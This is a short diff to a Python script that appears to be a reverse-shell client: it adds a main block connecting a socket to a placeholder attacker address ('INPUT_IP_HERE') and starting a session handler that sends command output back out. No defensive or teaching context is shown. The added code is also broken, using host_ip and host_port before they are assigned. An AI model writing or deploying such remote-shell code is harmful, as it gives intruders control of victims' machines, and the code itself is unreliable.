@@ -59,3 +59,11 @@ def session_handler():
                 outbound(output.decode())
     except ConnectionRefusedError:
         pass
+
+if __name__ == '__main__':
+    secure_sock = create_secure_socket()
+    secure_sock.connect((host_ip, host_port))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    host_ip = 'INPUT_IP_HERE'
+    host_port = 'INPUT_PORT_HERE'  # Ensure this is an integer or a string that represents an integer
+    session_handler()
